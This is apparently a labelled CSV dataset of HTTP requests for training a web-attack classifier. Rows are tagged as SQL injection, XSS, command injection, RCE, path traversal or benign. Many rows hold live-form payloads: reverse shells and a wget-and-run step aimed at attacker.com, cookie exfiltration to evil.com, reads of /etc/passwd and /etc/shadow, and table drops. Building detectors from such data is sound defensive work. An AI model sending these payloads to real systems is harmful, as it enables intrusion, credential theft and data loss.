request_normalized,label
"POST /tools/lookup?domain=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 191

input=; python3 -c 'import socket;s=socket.socket();s.connect((""attacker.com"",4444));import os;os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.system(""/bin/sh"")'&submit=1",cmdi
"POST /tools/lookup?domain=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 39

input=; ping -c 4 attacker.com&submit=1",cmdi
"GET /products?filter=admin' # HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"POST /exec?cmd=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 40

input=| type C:\Windows\win.ini&submit=1",cmdi
"POST /search?q=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 43

input='; EXEC xp_cmdshell('dir')--&submit=1",sqli
"GET /api/process?data=system('id') HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",rce
"GET /search?q=1' OR 1=1-- HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"GET /tools/lookup?domain=; wget http://attacker.com/shell.sh -O /tmp/shell.sh && chmod x /tmp/shell.sh && /tmp/shell.sh HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"GET /user?id=1 UNION SELECT null,password FROM users-- HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"GET /products?filter=1'; DROP TABLE users-- HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"GET /search?q=<svg onload=alert(1)> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"GET /profile?bio=<script>alert('xss')</script> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"GET /news/article/hello-world HTTP/1.1
Host: news.example.com
Accept: text/html",benign
"POST /view?doc=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 37

input=../../../../etc/shadow&submit=1",path_traversal
"POST /template?expr=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 21

input=${7*7}&submit=1",rce
"GET /view?doc=../../etc/passwd HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"GET /api/categories HTTP/1.1
Host: example.com
Accept: application/json",benign
"GET /eval?code={{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}} HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",rce
"GET /assets?path=../../../etc/passwd HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"POST /tools/lookup?domain=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 38

input=| nslookup attacker.com&submit=1",cmdi
"POST /products?filter=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 23

input=admin'--&submit=1",sqli
"POST /view?doc=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 46

input=../../../etc/passwd&submit=1",path_traversal
"GET /calc?formula=exec('import os; os.system(""calc.exe"")') HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",rce
"GET /search?q=books&lang=en HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Cookie: session=686fa4a613cf3b5c",benign
"GET /assets?path=....//....//etc/passwd HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"GET /assets?path=../../../etc/passwd HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"GET /view?doc=../etc/passwd HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"POST /admin/run?input=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

input=&& cat /etc/passwd&submit=1",cmdi
"GET /admin/run?input=; python3 -c 'import socket;s=socket.socket();s.connect((""attacker.com"",4444));import os;os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.system(""/bin/sh"")' HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"GET /comment?text=""><script>alert(document.cookie)</script> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"POST /assets?path=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 40

input=/var/www/../../etc/passwd&submit=1",path_traversal
"POST /api/users/7517/update HTTP/1.1
Host: api.example.com
Content-Type: application/json

{""name"":""john_doe"",""email"":""user@example.com""}",benign
"POST /search?q=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 41

input=<body onload=alert('XSS')>&submit=1",xss
"POST /download?file=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 35

input=../etc/passwd.jpg&submit=1",path_traversal
"GET /feedback?msg=<script>alert('XSS')</script> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"POST /view?doc=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 36

input=../////etc/////passwd&submit=1",path_traversal
"GET /comment?text=<img src=x onerror=alert('XSS')> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"POST /calc?formula=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 62

input={{lipsum.__globals__['os'].popen('id').read()}}&submit=1",rce
"POST /search?q=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 68

input=<input type=text value='' onfocus=alert(1) autofocus>&submit=1",xss
"POST /search?q=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 58

input=<iframe src='javascript:alert(1)'></iframe>&submit=1",xss
"GET /api/categories HTTP/1.1
Host: example.com
Accept: application/json",benign
"POST /download?file=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 37

input=....//....//etc/passwd&submit=1",path_traversal
"GET /admin/run?input=| nc attacker.com 4444 -e /bin/bash HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"POST /download?file=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

input=../../boot.ini&submit=1",path_traversal
"GET /products?filter=' OR '1'='1 HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"GET /image?src=../etc/passwd HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"POST /download?file=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

input=file:///etc/passwd&submit=1",path_traversal
"GET /api/v2/orders?status=pending&user_id=3962 HTTP/1.1
Host: api.example.com
Authorization: Bearer a1e939c4d20702093084f51f5560e4e0",benign
"GET /products?filter=' UNION SELECT *, NULL FROM users-- HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"POST /download?file=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 55

input=../../../../../../../../../../etc/passwd&submit=1",path_traversal
"POST /search?q=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 24

input=1 AND 1=1&submit=1",sqli
"POST /comment?text=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 68

input=<input type=text value='' onfocus=alert(1) autofocus>&submit=1",xss
"POST /search?q=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 41

input=<body onload=alert('XSS')>&submit=1",xss
"POST /api/process?data=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 55

input=eval(base64_decode('c3lzdGVtKCdpZCcp'));&submit=1",rce
"GET /download?file=/etc/passwd HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"GET /news/article/getting-started HTTP/1.1
Host: news.example.com
Accept: text/html",benign
"POST /tools/lookup?domain=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 23

input=| whoami&submit=1",cmdi
"GET /comment?text=<details open ontoggle=alert(1)> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"POST /download?file=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 34

input=../../../etc/passwd&submit=1",path_traversal
"GET /assets?path=../../boot.ini HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"POST /search?q=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 24

input=1 AND 1=1&submit=1",sqli
"POST /calc?formula=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 81

input={{config.__class__.__init__.__globals__['os'].popen('id').read()}}&submit=1",rce
"POST /admin/run?input=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 40

input=| type C:\Windows\win.ini&submit=1",cmdi
"GET /products?filter=1' OR 1=1-- HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"GET /comment?text=<svg onload=alert(1)> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"POST /api/process?data=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 21

input=*{7*7}&submit=1",rce
"POST /search?q=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 36

input=<svg onload=alert(1)>&submit=1",xss
"GET /assets?path=../../../../../../../../../../etc/passwd HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"GET /api/products?category=phone&page=46&sort=price HTTP/1.1
Host: shop.example.com
User-Agent: Mozilla/5.0
Accept: application/json",benign
"GET /user?id=1'; INSERT INTO users VALUES('hacker','hacked')-- HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"POST /assets?path=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 44

input=../etc/passwd&submit=1",path_traversal
"GET /products?filter=1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"POST /assets?path=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 37

input=....//....//etc/passwd&submit=1",path_traversal
"GET /news/article/hello-world HTTP/1.1
Host: news.example.com
Accept: text/html",benign
"GET /user?id=admin'-- HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"GET /feedback?msg=<body onload=alert('XSS')> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"GET /api/v2/orders?status=pending&user_id=1515 HTTP/1.1
Host: api.example.com
Authorization: Bearer 97c6a15529789e45baaf97b1a47e8f48",benign
"GET /tools/lookup?domain=`id` HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"POST /search?q=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 50

input=' UNION ALL SELECT NULL,NULL,NULL--&submit=1",sqli
"POST /user?id=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 50

input=1; SELECT * FROM users WHERE '1'='1&submit=1",sqli
"POST /feedback?msg=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 48

input=<IMG SRC=JaVaScRiPt:alert('XSS')>&submit=1",xss
"POST /template?expr=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 37

input=;assert(system('id'));&submit=1",rce
"POST /profile?bio=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 57

input=<a href='javascript:alert(1)'>click me</a>&submit=1",xss
"GET /calc?formula={{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}} HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",rce
"GET /api/process?data=#{7*7} HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",rce
"POST /assets?path=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 46

input=../../../etc/passwd&submit=1",path_traversal
"POST /search?q=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 32

input=1' AND SLEEP(5)--&submit=1",sqli
"POST /view?doc=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 37

input=../../../../etc/shadow&submit=1",path_traversal
"GET /user?id=' OR EXISTS(SELECT * FROM users WHERE username='admin')-- HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"GET /search?q=<script>alert('XSS')</script> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"GET /products?filter=admin' # HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"GET /user?id=1' AND SLEEP(5)-- HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"POST /profile?bio=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 68

input=<input type=text value='' onfocus=alert(1) autofocus>&submit=1",xss
"POST /profile?bio=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 36

input=<svg onload=alert(1)>&submit=1",xss
"POST /calc?formula=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 52

input=<?php passthru('cat /etc/passwd'); ?>&submit=1",rce
"GET /profile?bio=<img src=x onerror=alert('XSS')> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"GET /products?filter=' OR 1=1-- HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"GET /eval?code={{7*7}} HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",rce
"GET /api/products?category=watch&page=4&sort=price HTTP/1.1
Host: shop.example.com
User-Agent: Mozilla/5.0
Accept: application/json",benign
"POST /search?q=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 23

input=admin' #&submit=1",sqli
"GET /tools/lookup?domain=$(cat /etc/passwd) HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"GET /api/process?data=${T(java.lang.Runtime).getRuntime().exec('id')} HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",rce
"POST /admin/run?input=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

input=; rm -rf /tmp/*&submit=1",cmdi
"GET /images/img_3667.jpg HTTP/1.1
Host: cdn.example.com
Referer: https://example.com/",benign
"GET /admin/run?input=$(cat /etc/passwd) HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"GET /products?filter='; EXEC xp_cmdshell('dir')-- HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"GET /api/categories HTTP/1.1
Host: example.com
Accept: application/json",benign
"POST /products?filter=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

input=1' OR 1=1--&submit=1",sqli
"GET /api/ping?host=& ipconfig HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"GET /comment?text=<script>document.write('<img src=http://evil.com/' document.cookie '>')</script> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"GET /assets?path=../////etc/////passwd HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"POST /user?id=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 34

input=' OR '1'='1&submit=1",sqli
"GET /api/v2/orders?status=pending&user_id=5139 HTTP/1.1
Host: api.example.com
Authorization: Bearer e1bf98eda6c14fdb2fe45857c8d4502c",benign
"POST /eval?code=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 25

input=[[${7*7}]]&submit=1",rce
"POST /user?id=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 24

input=' OR ''='&submit=1",sqli
"GET /user?id=1 OR 1=1 HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"POST /tools/lookup?domain=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 19

input=`id`&submit=1",cmdi
"GET /api/products?category=watch&page=43&sort=price HTTP/1.1
Host: shop.example.com
User-Agent: Mozilla/5.0
Accept: application/json",benign
"POST /template?expr=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 52

input=<% Runtime.getRuntime().exec('id') %>&submit=1",rce
"GET /products?filter=' OR EXISTS(SELECT * FROM users WHERE username='admin')-- HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"GET /profile?bio='-alert(1)-' HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"POST /api/users/2771/update HTTP/1.1
Host: api.example.com
Content-Type: application/json

{""name"":""alice_miller"",""email"":""user@example.com""}",benign
"POST /download?file=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 47

input=..\..\..\windows\win.ini&submit=1",path_traversal
